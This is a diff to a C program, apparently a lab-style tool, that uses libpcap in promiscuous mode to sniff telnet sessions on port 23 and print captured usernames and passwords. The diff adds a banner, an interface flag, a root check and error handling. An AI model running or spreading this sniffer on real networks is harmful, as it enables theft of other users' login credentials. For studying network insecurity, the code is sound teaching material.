@@ -6,10 +6,10 @@
 #include <net/ethernet.h>
 #include <netinet/ip.h>
 #include <netinet/tcp.h>
+#include <unistd.h>
+
 
 #define EOL 0x0d // end of line character "\n\r"
-#define NIC "wlp0s20f3"
-
 
 int captureTelnet = 0; // to check if we need to start sniffing username/password
 int etherhdlen = 14; // Doesn't change 
@@ -20,11 +20,39 @@ struct sockaddr_in IPaddr;
 struct ether_header *eth_header;
 struct iphdr *ip_header;
 struct tcphdr *tcp_header;
+char *NIC;
+struct iphdr *last_con;
 
+
+void banner(){
+	printf("████████╗███████╗██╗     ███████╗███╗   ██╗██╗███████╗███████╗\n");
+    printf("╚══██╔══╝██╔════╝██║     ██╔════╝████╗  ██║██║██╔════╝██╔════╝\n");
+    printf("   ██║   █████╗  ██║     ███████╗██╔██╗ ██║██║█████╗  █████╗  \n");
+    printf("   ██║   ██╔══╝  ██║     ╚════██║██║╚██╗██║██║██╔══╝  ██╔══╝  \n");
+    printf("   ██║   ███████╗███████╗███████║██║ ╚████║██║██║     ██║     \n");
+    printf("   ╚═╝   ╚══════╝╚══════╝╚══════╝╚═╝  ╚═══╝╚═╝╚═╝     ╚═╝     \n");
+}
+
+// print app prompt 
+void usage(char *appname){
+    printf("Usage:sudo %s -i <network-interface>\n", appname);
+	printf("\n");
+	return;
+} 
+
+
+uint8_t checkipaddr(struct iphdr *ip_header){
+	if (last_con->saddr != ip_header->saddr &&
+		last_con->daddr != ip_header->daddr){
+		last_con = ip_header;
+		return 0;
+	}
+	return 1;
+}
 
 void telnet_from_server(u_short headerLen, const u_char *packetData, int tcphdrlen, int iphdrlen){
 	
-    u_char *telnet_head;
+	u_char *telnet_head;
 
     // if header length is big enough to contain server login message
     if (headerLen > etherhdlen + iphdrlen + tcphdrlen + 1)
@@ -53,11 +81,11 @@ void telnet_from_server(u_short headerLen, const u_char *packetData, int tcphdrl
             }
 			if ((strncmp(telnet_head, "P", 1) == 0) ||
 				 (strncmp(telnet_head, "p", 1) == 0)){
-			// got the "P" or "p" in "password"
-			// user input will be password letters after this point
-			printf("Password Capture!\n");
-			printf("	Password: ");
-			captureTelnet = 1;
+				// got the "P" or "p" in "password"
+				// user input will be password letters after this point
+				printf("Password Capture!\n");
+				printf("	Password: ");
+				captureTelnet = 1;
 			}
 		}
     }
@@ -99,7 +127,10 @@ We can process each packet inside the function.
 */
 void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet){//the packet handler function
 	eth_header = (struct ether_header *) packet; //bulidding ethernet header
-	ip_header = (struct iphdr *)(packet + etherhdlen); //building IP header
+	ip_header = (struct iphdr *)(packet + etherhdlen); //building IP heade
+	if (checkipaddr(ip_header) == 1){
+		return;
+	}
 	int iphdrlen = ip_header->ihl*4; // detecting ip header length
 	tcp_header = (struct tcphdr *)(packet + etherhdlen + iphdrlen);
 	int tcphdrlen = tcp_header->th_off * 4;
@@ -114,16 +145,43 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
     	}
 }
 
-int main()
-	{
+int main(int argc, char *argv[]){
+
+	banner();
+
+	// chceck if run as sudo
+	if (getuid() != 0){
+		printf("Run as root\n");
+		exit(EXIT_FAILURE);	
+	}
+
+	if (argc < 3){
+		usage(argv[0]);
+		exit(EXIT_FAILURE);
+	}
+	// take NIC from flag -i 
+	for (int i = 0; i < 2; i++){
+		if (strcmp("-i", argv[i]) == 0){
+			NIC = argv[i+1];
+		}
+	}
+
+	printf("Sniffing on device: %s\n", NIC);
+
 	pcap_t *handle;
 	char errbuf[PCAP_ERRBUF_SIZE];// buffer for ERROR
 	struct bpf_program fp;
-	char filter_exp[] = "tcp port 23";// here we can filter what we want currently filtering nothing
+	char *filter_exp = "tcp port 23";// here we can filter what we want currently filtering nothing
 	bpf_u_int32 net;
+
 	// Step 1: Open live pcap session on containers interface
 	//The value 1 of the third parameter turns on the promiscuous mode 
 	handle = pcap_open_live(NIC, BUFSIZ, 1, 1000, errbuf); 
+
+	if (handle == NULL) {
+		fprintf(stderr, "Couldn't open device %s: %s\n", NIC, errbuf);
+		exit(EXIT_FAILURE);
+	}
 	
 	// Step 2: Compile filter_exp into BPF psuedo-code
 	pcap_compile(handle, &fp, filter_exp, 0, net);
@@ -131,6 +189,8 @@ int main()
 		pcap_perror(handle, "Error:");
 		exit(EXIT_FAILURE);
 	}
+
+	printf("Starting to pcap loop\n");
 	
 	// Step 3: Capture packets
 	pcap_loop(handle, -1, got_packet, NULL);
